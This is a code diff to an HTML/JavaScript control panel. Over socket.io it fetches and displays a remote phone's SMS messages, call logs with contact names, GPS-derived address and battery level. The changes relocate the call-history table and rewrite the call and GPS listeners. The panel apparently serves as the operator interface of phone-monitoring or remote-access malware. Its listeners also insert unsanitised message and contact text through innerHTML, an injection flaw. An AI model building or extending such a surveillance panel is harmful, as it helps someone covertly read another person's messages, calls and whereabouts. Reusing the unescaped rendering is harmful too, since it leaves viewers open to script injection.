@@ -29,7 +29,13 @@
     <div class="nav-item" onclick="showView('sms')">✉️ SMS Logs</div>
     <div class="nav-item" onclick="showView('calls')">📞 Call Logs</div>
 </div>
-
+<div id="calls" class="view">
+    <h2>Call History</h2>
+    <table>
+        <thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Date</th></tr></thead>
+        <tbody id="calls-table"></tbody>
+    </table>
+</div>
 <div class="main-content">
     <div class="top-nav">
         <div id="gps-box" style="color:#7f8c8d;">📍 <span id="addr">Waiting for GPS...</span></div>
@@ -46,19 +52,17 @@
         <table><thead><tr><th>Type</th><th>Number</th><th>Message</th><th>Date</th></tr></thead><tbody id="sms-table"></tbody></table>
     </div>
 
-    <div id="calls" class="view">
-        <h2>Call Logs</h2>
-        <table><thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Date</th></tr></thead><tbody id="calls-table"></tbody></table>
-    </div>
+    
 </div>
 
 <script>
     const socket = io();
+   // Update showView function
     function showView(id) {
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
         document.getElementById(id).classList.add('active');
         if(id === 'sms') socket.emit('get-sms-request');
-        if(id === 'calls') socket.emit('get-calls-request');
+        if(id === 'calls') socket.emit('get-calls-request'); // Request calls
     }
 
     socket.on('ui-battery', (data) => {
@@ -70,17 +74,19 @@
     socket.on('ui-sms-display', (data) => {
         document.getElementById('sms-table').innerHTML = data.map(m => `<tr><td class="${m.type}">${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>`).join('');
     });
+// NEW: Call Log Listener
+    socket.on('ui-calls-display', (data) => {
+        const html = data.map(c => `<tr><td class="${c.type}">${c.type}</td><td>${c.name || 'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
+        document.getElementById('calls-table').innerHTML = html;
+    });
 
-   socket.on('ui-calls-display', (data) => {
-    const html = data.map(c => `<tr><td>${c.type}</td><td>${c.name || 'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
-    document.getElementById('calls-table').innerHTML = html;
-});
-
-socket.on('ui-gps', (data) => {
-    // If you have an address span or map:
-    document.getElementById('addr-display').innerText = data.address;
-});
+    // NEW: GPS Address Listener
+    socket.on('ui-gps', (data) => {
+        // Update your existing battery bar or add a new address span
+        document.getElementById('pct').innerHTML = data.address + " | " + document.getElementById('pct').innerText;
+    });
 </script>
 </body>
 </html>
+
 
